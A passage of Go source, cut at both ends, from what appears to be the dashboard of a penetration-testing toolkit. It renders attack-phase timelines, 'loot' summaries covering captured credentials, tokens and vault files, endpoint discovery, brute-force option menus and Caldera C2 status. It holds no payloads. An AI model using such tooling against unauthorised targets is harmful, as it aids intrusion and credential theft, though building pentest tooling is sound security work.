	case "ANALYSIS::CORRELATE", "ANALYSIS::RISK_SCORE":
		return controlAction{
			Label:       "Fire Follow-Up :: graph-prep",
			Description: "Generate a quick command/loot digest ready for graph ingestion.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py show --run latest",
			Args:        []string{"python3", "./scripts/telemetryctl.py", "show", "--run", "latest"},
		}
	case "VALIDATION::CROSS_CHECK", "VALIDATION::GAP_TRACK":
		return controlAction{
			Label:       "Fire Follow-Up :: stack-check",
			Description: "Re-verify OSINT toolchain and close execution gaps.",
			Mode:        "kali",
			Command:     "docker exec h3retik-kali bash -lc \"osint-stack-check\"",
			KaliShell:   "osint-stack-check",
		}
	case "REPORTING::INTEL_EXPORT", "REPORTING::ACTION_BRIEF":
		return controlAction{
			Label:       "Fire Follow-Up :: snapshot",
			Description: "Freeze telemetry + evidence for reporting handoff.",
			Mode:        "local",
			Command:     "python3 ./scripts/telemetryctl.py snapshot",
			Args:        []string{"python3", "./scripts/telemetryctl.py", "snapshot"},
		}
	default:
		return controlAction{
			Label:       "No mapped follow-up",
			Description: "No executable mapping for this taxonomy node.",
			Mode:        "internal",
			Command:     "",
		}
	}
}

func taxonomyAnimation(outcome string, busy bool, until time.Time) string {
	now := time.Now().UnixNano()
	if busy || outcome == "running" {
		frames := []string{
			"[>    ]",
			"[>>   ]",
			"[ >>> ]",
			"[  >>>]",
			"[   >>]",
			"[    >]",
		}
		return frames[int((now/120_000_000)%int64(len(frames)))]
	}
	if time.Now().After(until) {
		return "(idle)"
	}
	if outcome == "success" {
		frames := []string{"(^_^)", "\\(^_^)/", "(^_^)ﾉ"}
		return frames[int((now/180_000_000)%int64(len(frames)))]
	}
	if outcome == "failed" {
		frames := []string{"(x_x)", "(x_x;)", "(;x_x)"}
		return frames[int((now/180_000_000)%int64(len(frames)))]
	}
	return "(idle)"
}

func replacePrefix(line string, width int, replacement string) string {
	if len(line) < width {
		return replacement
	}
	return replacement + line[width:]
}

func replaceAfterMarker(line, marker, newLabel string) string {
	idx := strings.Index(line, marker)
	if idx == -1 {
		return line
	}
	return line[:idx+len(marker)] + newLabel
}

func taxonomyEntities(category, sub string, commands []commandEntry, findings []findingEntry, loot []lootEntry) []taxonomyEntity {
	out := []taxonomyEntity{}
	add := func(kind, label, detail string) {
		out = append(out, taxonomyEntity{Kind: kind, Label: label, Detail: detail})
	}
	osintCommandMatch := func(cmd commandEntry) bool {
		lc := strings.ToLower(cmd.Command + " " + cmd.Tool)
		return strings.Contains(lc, "osint-") || strings.Contains(lc, "theharvester") || strings.Contains(lc, "bbot") || strings.Contains(lc, "spiderfoot") || strings.Contains(lc, "recon-ng") || strings.Contains(lc, "rengine")
	}
	for _, f := range findings {
		switch {
		case category == "INPUT" && strings.Contains(strings.ToLower(f.Title+f.Endpoint+f.Evidence), "seed"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Evidence)
		case category == "DISCOVERY" && strings.Contains(strings.ToLower(f.Title+f.Evidence), "discovery"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Evidence)
		case category == "COLLECTION" && strings.Contains(strings.ToLower(f.Title+f.Evidence), "collection"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Evidence)
		case category == "PROCESSING" && strings.Contains(strings.ToLower(f.Title+f.Evidence), "normalize"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Impact)
		case category == "ANALYSIS" && strings.Contains(strings.ToLower(f.Title+f.Impact), "correlat"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Evidence)
		case category == "VALIDATION" && strings.Contains(strings.ToLower(f.Title+f.Evidence), "validat"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Impact)
		case category == "REPORTING" && strings.Contains(strings.ToLower(f.Title+f.Impact), "report"):
			add("finding", f.Title, f.Endpoint+" :: "+f.Impact)
		}
	}
	for _, item := range loot {
		switch {
		case category == "INPUT" && strings.Contains(strings.ToLower(item.Name+item.Source), "seed"):
			add(item.Kind, item.Name, item.Source)
		case category == "DISCOVERY" && (strings.Contains(strings.ToLower(item.Name+item.Source), "subdomain") || strings.Contains(strings.ToLower(item.Source), "spiderfoot")):
			add(item.Kind, item.Name, item.Source)
		case category == "COLLECTION" && strings.Contains(strings.ToLower(item.Source+item.Preview), "artifacts/osint"):
			add(item.Kind, item.Name, item.Source)
		case category == "PROCESSING" && strings.Contains(strings.ToLower(item.Name+item.Preview), "json"):
			add(item.Kind, item.Name, item.Source)
		case category == "ANALYSIS" && strings.Contains(strings.ToLower(item.Name+item.Source), "graph"):
			add(item.Kind, item.Name, item.Source)
		case category == "VALIDATION" && strings.Contains(strings.ToLower(item.Name+item.Preview), "check"):
			add(item.Kind, item.Name, item.Source)
		case category == "REPORTING" && strings.Contains(strings.ToLower(item.Name+item.Source), "report"):
			add(item.Kind, item.Name, item.Source)
		}
	}
	for _, cmd := range commands {
		switch {
		case category == "INPUT" && (strings.Contains(strings.ToLower(cmd.Command), "osint-seed-harvest") || strings.Contains(strings.ToLower(cmd.Command), "theharvester")):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "DISCOVERY" && (strings.Contains(strings.ToLower(cmd.Command), "osint-deep-bbot") || strings.Contains(strings.ToLower(cmd.Command), "osint-deep-spiderfoot")):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "COLLECTION" && (strings.Contains(strings.ToLower(cmd.Command), "osint-reconng") || strings.Contains(strings.ToLower(cmd.Command), "osint-rengine")):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "PROCESSING" && strings.Contains(strings.ToLower(cmd.Command), "find /artifacts/osint"):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "ANALYSIS" && strings.Contains(strings.ToLower(cmd.Command), "telemetryctl.py show"):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "VALIDATION" && strings.Contains(strings.ToLower(cmd.Command), "osint-stack-check"):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "REPORTING" && strings.Contains(strings.ToLower(cmd.Command), "telemetryctl.py snapshot"):
			add("command", truncate(cmd.Command, 64), shortTime(cmd.Timestamp))
		case category == "DISCOVERY" && osintCommandMatch(cmd):
			add("command", truncate(cmd.Command, 64), "osint command telemetry")
		}
	}
	return dedupeTaxonomyEntities(out)
}

func dedupeTaxonomyEntities(items []taxonomyEntity) []taxonomyEntity {
	seen := map[string]bool{}
	out := []taxonomyEntity{}
	for _, item := range items {
		key := item.Kind + "::" + item.Label
		if seen[key] {
			continue
		}
		seen[key] = true
		out = append(out, item)
	}
	return out
}

func attackTimeline(commands []commandEntry, width int) string {
	phaseLabels := map[string]string{
		"recon":          "RECON",
		"enumeration":    "ENUM",
		"fingerprint":    "FP",
		"auth-bypass":    "AUTH",
		"auth":           "AUTH",
		"loot":           "LOOT",
		"exfil":          "EXFIL",
		"tamper":         "TAMPER",
		"post-exploit":   "POST",
		"post-ex":        "POST",
		"storefront":     "STORE",
		"persistence":    "PERSIST",
		"initial-access": "ACCESS",
	}
	seen := map[string]bool{}
	ordered := []string{}
	for i := len(commands) - 1; i >= 0; i-- {
		phase := strings.TrimSpace(strings.ToLower(commands[i].Phase))
		if phase == "" || seen[phase] {
			continue
		}
		seen[phase] = true
		label := phaseLabels[phase]
		if label == "" {
			label = strings.ToUpper(truncate(phase, 8))
		}
		ordered = append(ordered, phasePill(label))
	}
	if len(ordered) == 0 {
		return "no attack phases recorded"
	}
	return wrap(strings.Join(ordered, " -> "), width)
}

func targetDiff(commands []commandEntry, findings []findingEntry, loot []lootEntry, width int) string {
	lines := []string{}
	if hasFindingMatch(findings, "tamper") || hasFindingMatch(findings, "integrity") || hasCommandMatch(commands, "PUT ") || hasCommandMatch(commands, "PATCH ") || hasCommandMatch(commands, "DELETE ") {
		lines = append(lines, "write-path integrity change observed")
	}
	if hasFindingMatch(findings, "auth") || hasLootMatch(loot, "token") || hasLootMatch(loot, "credential") {
		lines = append(lines, "auth boundary or session state changed")
	}
	if hasFindingMatch(findings, "backup") || hasLootMatch(loot, ".bak") || hasLootMatch(loot, "backup") {
		lines = append(lines, "backup or historical artifacts became reachable")
	}
	if hasLootMatch(loot, "document") || hasLootMatch(loot, ".pdf") || hasLootMatch(loot, ".doc") || hasLootMatch(loot, ".csv") {
		lines = append(lines, "sensitive document flow detected")
	}
	if hasLootMatch(loot, ".db") || hasLootMatch(loot, ".sql") || hasLootMatch(loot, ".kdbx") {
		lines = append(lines, "database or vault-like artifact captured")
	}
	if len(lines) == 0 {
		lines = append(lines, "no high-confidence target-surface delta inferred yet")
	}
	return wrap(strings.Join(lines, " | "), width)
}

func tamperIntegrity(commands []commandEntry, loot []lootEntry, width int) string {
	writeOps := 0
	for _, cmd := range commands {
		upper := strings.ToUpper(strings.TrimSpace(cmd.Command))
		if strings.Contains(upper, " PUT ") || strings.Contains(upper, " PATCH ") || strings.Contains(upper, " DELETE ") {
			writeOps++
		}
	}
	lines := []string{
		fmt.Sprintf("write operations: %d", writeOps),
	}
	if hasLootMatch(loot, "collection") || hasLootMatch(loot, "record") || hasLootMatch(loot, "snapshot") {
		lines = append(lines, "state snapshot captured after mutation")
	}
	if writeOps > 0 {
		lines = append(lines, "integrity-impact path has been exercised")
		lines = append(lines, "validate before/after state in evidence")
	}
	return wrap(strings.Join(lines, " | "), width)
}

func credGraph(loot []lootEntry, width int) string {
	token := ""
	credential := ""
	binary := ""
	for _, item := range loot {
		switch strings.ToLower(item.Kind) {
		case "token":
			if token == "" {
				token = item.Name
			}
		case "credential":
			if credential == "" {
				credential = item.Preview
			}
		case "binary":
			if binary == "" {
				binary = item.Name
			}
		}
	}
	lines := []string{}
	if credential != "" {
		lines = append(lines, truncate(credential, width))
	}
	if token != "" {
		lines = append(lines, "credential/token -> privileged resource access path")
	}
	if binary != "" {
		lines = append(lines, binary+" <- binary/vault artifact path")
	}
	if len(lines) == 0 {
		return "no credential chain inferred yet"
	}
	return wrap(strings.Join(lines, " | "), width)
}

func lootSummary(loot []lootEntry, width int) string {
	if len(loot) == 0 {
		return "no loot telemetry yet"
	}
	counts := map[string]int{}
	for _, item := range loot {
		key := strings.ToLower(strings.TrimSpace(item.Kind))
		if key == "" {
			key = "unknown"
		}
		counts[key]++
	}
	keys := make([]string, 0, len(counts))
	for k := range counts {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	lines := []string{metricLine("total", fmt.Sprintf("%d", len(loot)))}
	for i, key := range keys {
		if i >= 8 {
			lines = append(lines, lipgloss.NewStyle().Foreground(lipgloss.Color("241")).Render(fmt.Sprintf("+%d more kinds", len(keys)-i)))
			break
		}
		lines = append(lines, fmt.Sprintf("%s x%d", kindBadge(key), counts[key]))
	}
	return wrap(strings.Join(lines, "  "), width)
}

func recentLoot(loot []lootEntry, width int) string {
	if len(loot) == 0 {
		return "none"
	}
	lines := []string{}
	for i, item := range loot {
		if i >= 6 {
			break
		}
		lines = append(lines, fmt.Sprintf("%s %s", kindBadge(item.Kind), truncate(item.Name+" :: "+item.Source, max(20, width-8))))
	}
	return strings.Join(lines, "\n")
}

func controlDigest(findings []findingEntry, loot []lootEntry, width int) string {
	lines := []string{
		metricLine("critical findings", fmt.Sprintf("%d", countSeverity(findings, "critical"))),
		metricLine("high findings", fmt.Sprintf("%d", countSeverity(findings, "high"))),
		metricLine("loot items", fmt.Sprintf("%d", len(loot))),
	}
	if len(findings) > 0 {
		lines = append(lines, "latest finding :: "+truncate(findings[0].Title, max(18, width-18)))
	}
	if len(loot) > 0 {
		lines = append(lines, "latest loot :: "+truncate(loot[0].Name, max(18, width-14)))
	}
	return strings.Join(lines, "\n")
}

func commandMode(entry commandEntry) string {
	meta := strings.ToLower(strings.TrimSpace(entry.Tool + " " + entry.Command + " " + entry.Phase))
	if meta == "" {
		return "exploit"
	}
	onchainMarkers := []string{"onchain", "slither", "mythril", "forge", "cast", "anvil", "echidna", "medusa", "halmos", "rpc-check", "address-flow"}
	for _, marker := range onchainMarkers {
		if strings.Contains(meta, marker) {
			return "onchain"
		}
	}
	osintMarkers := []string{"osint", "theharvester", "bbot", "spiderfoot", "recon-ng", "reconng", "rengine", "maltego"}
	for _, marker := range osintMarkers {
		if strings.Contains(meta, marker) {
			return "osint"
		}
	}
	coopMarkers := []string{"coop", "caldera", "/api/agents", "/api/operations", "sandcat", "stockpile"}
	for _, marker := range coopMarkers {
		if strings.Contains(meta, marker) {
			return "coop"
		}
	}
	return "exploit"
}

func commandsByMode(commands []commandEntry, mode string) []commandEntry {
	if strings.TrimSpace(mode) == "" {
		return commands
	}
	out := make([]commandEntry, 0, len(commands))
	for _, entry := range commands {
		if commandMode(entry) == strings.ToLower(strings.TrimSpace(mode)) {
			out = append(out, entry)
		}
	}
	return out
}

func commandDisplayOrderByMode(commands []commandEntry, mode string) []int {
	mode = strings.ToLower(strings.TrimSpace(mode))
	order := make([]int, 0, len(commands))
	for idx, entry := range commands {
		if commandMode(entry) == mode {
			order = append(order, idx)
		}
	}
	if mode == "" {
		return nil
	}
	return order
}

func scopedCommandSelectionIndex(scoped []commandEntry, selected commandEntry) int {
	if len(scoped) == 0 {
		return 0
	}
	selectedID := strings.TrimSpace(selected.CommandID)
	if selectedID != "" {
		for idx, entry := range scoped {
			if strings.EqualFold(strings.TrimSpace(entry.CommandID), selectedID) {
				return idx
			}
		}
	}
	selectedCmd := strings.TrimSpace(selected.Command)
	if selectedCmd != "" {
		for idx, entry := range scoped {
			if strings.TrimSpace(entry.Command) == selectedCmd && strings.TrimSpace(entry.Timestamp) == strings.TrimSpace(selected.Timestamp) {
				return idx
			}
		}
	}
	return 0
}

func findingsByMode(findings []findingEntry, mode string) []findingEntry {
	mode = strings.ToLower(strings.TrimSpace(mode))
	if mode == "" || mode == "exploit" {
		out := make([]findingEntry, 0, len(findings))
		for _, entry := range findings {
			if !isOSINTFinding(entry) && !isOnchainFinding(entry) && !isCoopFinding(entry) {
				out = append(out, entry)
			}
		}
		return out
	}
	out := make([]findingEntry, 0, len(findings))
	for _, entry := range findings {
		if mode == "osint" && isOSINTFinding(entry) {
			out = append(out, entry)
		}
		if mode == "onchain" && isOnchainFinding(entry) {
			out = append(out, entry)
		}
		if mode == "coop" && isCoopFinding(entry) {
			out = append(out, entry)
		}
	}
	return out
}

func findingDisplayOrderByMode(findings []findingEntry, mode string) []int {
	mode = strings.ToLower(strings.TrimSpace(mode))
	order := make([]int, 0, len(findings))
	for idx, entry := range findings {
		switch mode {
		case "osint":
			if isOSINTFinding(entry) {
				order = append(order, idx)
			}
		case "onchain":
			if isOnchainFinding(entry) {
				order = append(order, idx)
			}
		case "coop":
			if isCoopFinding(entry) {
				order = append(order, idx)
			}
		default:
			if !isOSINTFinding(entry) && !isOnchainFinding(entry) && !isCoopFinding(entry) {
				order = append(order, idx)
			}
		}
	}
	return order
}

func lootByMode(loot []lootEntry, mode string) []lootEntry {
	mode = strings.ToLower(strings.TrimSpace(mode))
	out := make([]lootEntry, 0, len(loot))
	for _, entry := range loot {
		switch mode {
		case "osint":
			if isOSINTLoot(entry) {
				out = append(out, entry)
			}
		case "onchain":
			if isOnchainLoot(entry) {
				out = append(out, entry)
			}
		case "coop":
			if isCoopLoot(entry) {
				out = append(out, entry)
			}
		default:
			if !isOSINTLoot(entry) && !isOnchainLoot(entry) && !isCoopLoot(entry) {
				out = append(out, entry)
			}
		}
	}
	return out
}

func isOSINTFinding(entry findingEntry) bool {
	meta := strings.ToLower(entry.Title + " " + entry.Endpoint + " " + entry.Impact + " " + entry.Evidence)
	markers := []string{"osint", "whois", "crt.sh", "theharvester", "bbot", "spiderfoot", "recon-ng", "rengine", "passive dns"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isOnchainFinding(entry findingEntry) bool {
	meta := strings.ToLower(entry.Title + " " + entry.Endpoint + " " + entry.Impact + " " + entry.Evidence)
	markers := []string{"onchain", "smart contract", "solidity", "evm", "slither", "mythril", "halmos", "echidna", "medusa", "erc20", "tx hash", "contract address"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func isCoopFinding(entry findingEntry) bool {
	meta := strings.ToLower(entry.Title + " " + entry.Endpoint + " " + entry.Impact + " " + entry.Evidence)
	markers := []string{"caldera", "coop", "c2", "sandcat", "stockpile", "operation", "agent"}
	for _, marker := range markers {
		if strings.Contains(meta, marker) {
			return true
		}
	}
	return false
}

func modeDigest(mode string, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		lines := []string{
			metricLine("osint findings", fmt.Sprintf("%d", len(findings))),
			metricLine("osint loot", fmt.Sprintf("%d", len(loot))),
			metricLine("entity hints", fmt.Sprintf("%d", len(findings)+len(loot))),
		}
		if len(loot) > 0 {
			lines = append(lines, "latest :: "+truncate(loot[0].Name, max(18, width-12)))
		}
		return strings.Join(lines, "\n")
	case "onchain":
		lines := []string{
			metricLine("onchain findings", fmt.Sprintf("%d", len(findings))),
			metricLine("onchain loot", fmt.Sprintf("%d", len(loot))),
			metricLine("flow artifacts", fmt.Sprintf("%d", countOnchainFlowArtifacts(loot))),
		}
		if len(loot) > 0 {
			lines = append(lines, "latest :: "+truncate(loot[0].Name, max(18, width-12)))
		}
		return strings.Join(lines, "\n")
	case "coop":
		agents := 0
		operations := 0
		for _, item := range loot {
			meta := strings.ToLower(item.Name + " " + item.Source + " " + item.Preview)
			if strings.Contains(meta, "agent") {
				agents++
			}
			if strings.Contains(meta, "operation") {
				operations++
			}
		}
		lines := []string{
			metricLine("co-op findings", fmt.Sprintf("%d", len(findings))),
			metricLine("co-op loot", fmt.Sprintf("%d", len(loot))),
			metricLine("agents/ops", fmt.Sprintf("%d/%d", agents, operations)),
		}
		if len(loot) > 0 {
			lines = append(lines, "latest :: "+truncate(loot[0].Name, max(18, width-12)))
		}
		return strings.Join(lines, "\n")
	default:
		return controlDigest(findings, loot, width)
	}
}

func modeTargetGraph(mode string, state stateFile, findings []findingEntry, loot []lootEntry, width int) string {
	switch strings.ToLower(strings.TrimSpace(mode)) {
	case "osint":
		seed := strings.TrimSpace(targetHostFromURL(state.TargetURL))
		if seed == "" {
			seed = "seed"
		}
		lines := []string{"seed -> " + seed}
		for i, item := range loot {
			if i >= 4 {
				break
			}
			lines = append(lines, seed+" -> "+truncate(item.Name, 36))
		}
		if len(lines) == 1 {
			lines = append(lines, "seed -> discovery pending")
		}
		return wrap(strings.Join(lines, " | "), width)
	case "onchain":
		address := "0x..."
		for _, item := range loot {
			if strings.Contains(strings.ToLower(item.Source+" "+item.Preview+" "+item.Name), "0x") {
				address = truncate(item.Name, 42)
				break
			}
		}
		lines := []string{"target -> " + address}
		for i, item := range loot {
			if i >= 4 {
				break
			}
			lines = append(lines, "artifact -> "+truncate(item.Name, 36))
		}
		if len(lines) == 1 {
			lines = append(lines, "artifact -> pending")
		}
		return wrap(strings.Join(lines, " | "), width)
	case "coop":
		lines := []string{"operator -> caldera-c2"}
		for i, item := range loot {
			if i >= 5 {
				break
			}
			lines = append(lines, "caldera-c2 -> "+truncate(item.Name, 36))
		}
		if len(lines) == 1 {
			lines = append(lines, "caldera-c2 -> sync pending")
		}
		return wrap(strings.Join(lines, " | "), width)
	default:
		return targetGraphView(state, findings, loot, width)
	}
}

func authenticatedWriteProven(commands []commandEntry, findings []findingEntry, loot []lootEntry) bool {
	if hasFindingMatch(findings, "tamper") || hasFindingMatch(findings, "integrity") || hasFindingMatch(findings, "record tampering") {
		return true
	}
	if hasLootMatch(loot, "collection") || hasLootMatch(loot, "record") || hasLootMatch(loot, "rename") {
		return true
	}
	return hasCommandMatch(commands, " -x put ") || hasCommandMatch(commands, " -x patch ") || hasCommandMatch(commands, " -x delete ") || hasCommandMatch(commands, " put /api/") || hasCommandMatch(commands, " patch /api/")
}

func exploitAPIDiscovery(findings []findingEntry, loot []lootEntry, targetURL string) []string {
	base := strings.TrimSpace(targetURL)
	if base == "" {
		return nil
	}
	allowedHost := ""
	if parsedBase, err := url.Parse(base); err == nil {
		allowedHost = strings.ToLower(strings.TrimSpace(parsedBase.Host))
	}
	seen := map[string]bool{}
	urlTokenRe := regexp.MustCompile(`https?://[^\s'"` + "`" + `,|;]+`)
	pathTokenRe := regexp.MustCompile(`/(?:api|rest|auth|login|oauth)[^\s'"` + "`" + `,|;]*`)
	methodPathTokenRe := regexp.MustCompile(`(?i)\b(?:get|post|put|patch|delete|head|options)\s+(/(?:api|rest|auth|login|oauth)[^\s'"` + "`" + `,|;]*)`)
	methodPrefixPathRe := regexp.MustCompile(`(?i)^/\s*(?:get|post|put|patch|delete|head|options)\s+(/.*)$`)
	extractCandidates := func(raw string) []string {
		text := strings.TrimSpace(raw)
		if text == "" {
			return nil
		}
		candidates := []string{}
		candidateSeen := map[string]bool{}
		addCandidate := func(value string) {
			value = strings.TrimSpace(strings.Trim(value, ".,;"))
			if value == "" {
				return
			}
			key := strings.ToLower(value)
			if candidateSeen[key] {
				return
			}
			candidateSeen[key] = true
			candidates = append(candidates, value)
		}
		for _, match := range urlTokenRe.FindAllString(text, -1) {
			addCandidate(match)
		}
		for _, match := range methodPathTokenRe.FindAllStringSubmatch(text, -1) {
			if len(match) > 1 {
				addCandidate(match[1])
			}
		}
		for _, match := range pathTokenRe.FindAllString(text, -1) {
			addCandidate(match)
		}
		if len(candidates) == 0 {
			addCandidate(text)
		}
		return candidates
	}
	sanitizeCandidate := func(candidate string) string {
		candidate = strings.TrimSpace(candidate)
		if candidate == "" {
			return ""
		}
		sanitizePath := func(rawPath string) string {
			rawPath = strings.TrimSpace(rawPath)
			if rawPath == "" {
				return ""
			}
			unescaped, err := url.PathUnescape(rawPath)
			if err == nil {
				rawPath = unescaped
			}
			rawPath = strings.Join(strings.Fields(rawPath), " ")
			if match := methodPrefixPathRe.FindStringSubmatch(rawPath); len(match) > 1 {
				rawPath = match[1]
			}
			rawPath = strings.TrimSpace(rawPath)
			if rawPath == "" || !strings.HasPrefix(rawPath, "/") || strings.Contains(rawPath, " ") {
				return ""
			}
			return rawPath
		}
		lower := strings.ToLower(candidate)
		if strings.HasPrefix(lower, "http://") || strings.HasPrefix(lower, "https://") {
			parsed, err := url.Parse(candidate)
			if err != nil || strings.TrimSpace(parsed.Host) == "" {
				return ""
			}
			cleanPath := sanitizePath(parsed.EscapedPath())
			if cleanPath == "" {
				cleanPath = sanitizePath(parsed.Path)
			}
			if cleanPath == "" {
				cleanPath = "/"
			}
			parsed.Path = cleanPath
			parsed.RawPath = ""
			parsed.Fragment = ""
			return parsed.String()
		}
		return sanitizePath(candidate)
	}
	add := func(raw string) {
		for _, candidate := range extractCandidates(raw) {
			trimmed := strings.TrimSpace(candidate)
			if trimmed == "" {
				continue
			}
			lower := strings.ToLower(trimmed)
			if !strings.Contains(lower, "/api/") &&
				!strings.Contains(lower, "/rest/") &&
				!strings.Contains(lower, "/auth") &&
				!strings.Contains(lower, "/login") &&
				!strings.Contains(lower, "/oauth") {
				continue
			}
			sanitized := sanitizeCandidate(trimmed)
			if sanitized == "" {
				continue
			}
			normalized := normalizeLootEndpoint(base, sanitized)
			if allowedHost != "" {
				if parsed, err := url.Parse(normalized); err == nil {
					candidateHost := strings.ToLower(strings.TrimSpace(parsed.Host))
					if candidateHost != "" && candidateHost != allowedHost {
						continue
					}
				}
			}
			key := strings.ToLower(normalized)
			if seen[key] {
				continue
			}
			seen[key] = true
		}
	}
	for _, finding := range findings {
		add(finding.Endpoint)
	}
	for _, item := range loot {
		add(item.Source)
		add(item.Name)
		add(item.Preview)
	}
	out := make([]string, 0, len(seen))
	for endpoint := range seen {
		out = append(out, endpoint)
	}
	sort.Strings(out)
	return out
}

func exploitInnerTargets(findings []findingEntry, loot []lootEntry, targetURL string) []string {
	base := strings.TrimSpace(targetURL)
	if base == "" {
		return nil
	}
	base = strings.TrimRight(base, "/")
	seen := map[string]bool{}
	add := func(raw string) {
		normalized := strings.TrimSpace(normalizeLootEndpoint(base, raw))
		if normalized == "" {
			return
		}
		if !strings.HasPrefix(strings.ToLower(normalized), "http://") && !strings.HasPrefix(strings.ToLower(normalized), "https://") {
			return
		}
		key := strings.ToLower(normalized)
		if seen[key] {
			return
		}
		seen[key] = true
	}
	add(base)
	for _, endpoint := range exploitAPIDiscovery(findings, loot, base) {
		add(endpoint)
	}
	for _, item := range loot {
		if strings.EqualFold(strings.TrimSpace(item.Kind), "path") || strings.EqualFold(strings.TrimSpace(item.Kind), "endpoint") {
			add(item.Source)
		}
	}
	out := make([]string, 0, len(seen))
	for endpoint := range seen {
		out = append(out, endpoint)
	}
	sort.Strings(out)
	return out
}

func bruteCredentialSources() []string {
	return []string{"inferred", "loot", "manual", "hybrid"}
}

func bruteAuthModes() []string {
	return []string{"auto", "basic", "form", "bearer"}
}

func (m model) selectedBruteCredentialSource() string {
	options := bruteCredentialSources()
	if len(options) == 0 {
		return "inferred"
	}
	return options[clampWrap(m.exploitBruteCredSrcIdx, len(options))]
}

func (m model) selectedBruteAuthMode() string {
	options := bruteAuthModes()
	if len(options) == 0 {
		return "auto"
	}
	return options[clampWrap(m.exploitBruteAuthModeIdx, len(options))]
}

func (m model) selectedExploitInnerTarget() string {
	targets := exploitInnerTargets(findingsByMode(m.findings, "exploit"), lootByMode(m.loot, "exploit"), m.state.TargetURL)
	if len(targets) == 0 {
		return ""
	}
	return targets[clampWrap(m.exploitInnerTargetIdx, len(targets))]
}

func (m model) effectiveExploitTargetURL() string {
	if selected := strings.TrimSpace(m.exploitActiveTarget); selected != "" {
		return selected
	}
	target := strings.TrimSpace(m.selectedExploitInnerTarget())
	if target != "" {
		return target
	}
	target = strings.TrimSpace(m.state.TargetURL)
	return target
}

func firstExistingRecordValue(record map[string]any, keys []string) string {
	for _, key := range keys {
		value, ok := record[key]
		if !ok {
			continue
		}
		text := strings.TrimSpace(fmt.Sprintf("%v", value))
		if text == "" || strings.EqualFold(text, "<nil>") || strings.EqualFold(text, "{}") || strings.EqualFold(text, "[]") {
			continue
		}
		return text
	}
	return ""
}

func normalizeCollectionBaseEndpoint(source, targetURL string) string {
	source = strings.TrimSpace(source)
	if source == "" {
		return ""
	}
	base := strings.TrimSpace(targetURL)
	if base == "" {
		return ""
	}
	normalized := normalizeLootEndpoint(base, source)
	parsed, err := url.Parse(normalized)
	if err != nil || strings.TrimSpace(parsed.Host) == "" {
		return ""
	}
	segments := []string{}
	for _, segment := range strings.Split(strings.Trim(parsed.Path, "/"), "/") {
		if strings.TrimSpace(segment) != "" {
			segments = append(segments, segment)
		}
	}
	if len(segments) == 0 {
		return strings.TrimRight(normalized, "/")
	}
	last := segments[len(segments)-1]
	if isLikelyRecordIDSegment(last) {
		segments = segments[:len(segments)-1]
	}
	if len(segments) == 0 {
		return strings.TrimRight(normalized, "/")
	}
	parsed.Path = "/" + strings.Join(segments, "/")
	parsed.RawQuery = ""
	parsed.Fragment = ""
	return strings.TrimRight(parsed.String(), "/")
}

func isLikelyRecordIDSegment(segment string) bool {
	trimmed := strings.TrimSpace(segment)
	if trimmed == "" {
		return false
	}
	if regexp.MustCompile(`^[0-9]+$`).MatchString(trimmed) {
		return true
	}
	if regexp.MustCompile(`^[0-9a-fA-F]{8,}$`).MatchString(trimmed) {
		return true
	}
	if regexp.MustCompile(`^[0-9a-fA-F-]{16,}$`).MatchString(trimmed) && strings.Contains(trimmed, "-") {
		return true
	}
	return false
}

type collectionRecord struct {
	ID       string
	Label    string
	Endpoint string
}

func extractCollectionRecords(loot []lootEntry, targetURL string) map[string][]collectionRecord {
	endpointRecords := map[string]map[string]collectionRecord{}
	for _, item := range loot {
		content := strings.TrimSpace(item.Preview)
		if content == "" {
			continue
		}
		value, ok := parseJSONBody(content)
		if !ok {
			continue
		}
		records := jsonRecordMaps(value)
		if len(records) == 0 {
			continue
		}
		endpoint := normalizeCollectionBaseEndpoint(item.Source, targetURL)
		if endpoint == "" {
			continue
		}
		if endpointRecords[endpoint] == nil {
			endpointRecords[endpoint] = map[string]collectionRecord{}
		}
		for _, record := range records {
			id := firstExistingRecordValue(record, []string{"id", "_id", "uuid", "key", "slug", "txHash", "hash", "address"})
			if id == "" {
				continue
			}
			id = strings.TrimSpace(strings.TrimSuffix(id, ".0"))
			if id == "" {
				continue
			}
			label := firstExistingRecordValue(record, []string{"name", "title", "label", "username", "email", "symbol", "status"})
			if label == "" {
				label = "record"
			}
			if _, exists := endpointRecords[endpoint][id]; !exists {
				endpointRecords[endpoint][id] = collectionRecord{
					ID:       id,
					Label:    label,
					Endpoint: endpoint,
				}
			}
		}
	}
	out := map[string][]collectionRecord{}
	for endpoint, recordsByID := range endpointRecords {
		recordIDs := make([]string, 0, len(recordsByID))
		for id := range recordsByID {
			recordIDs = append(recordIDs, id)
		}
		sort.Strings(recordIDs)
		out[endpoint] = make([]collectionRecord, 0, len(recordIDs))
		for _, id := range recordIDs {
			out[endpoint] = append(out[endpoint], recordsByID[id])
		}
	}
	return out
}

func localTargetURL(state stateFile) string {
	target := strings.TrimSpace(state.TargetURL)
	if target != "" {
		return target
	}
	dockerTarget := strings.TrimSpace(state.DockerTarget)
	if dockerTarget != "" {
		return dockerTarget
	}
	return ""
}

func kaliTargetURL(state stateFile) string {
	dockerTarget := strings.TrimSpace(state.DockerTarget)
	if dockerTarget != "" {
		return dockerTarget
	}
	target := strings.TrimSpace(state.TargetURL)
	if target != "" {
		return target
	}
	return ""
}

func rebaseEndpointForKali(raw string, state stateFile) string {
	trimmed := strings.TrimSpace(raw)
	kaliBase := strings.TrimRight(kaliTargetURL(state), "/")
	if trimmed == "" {
		if kaliBase == "" {
			return ""
		}
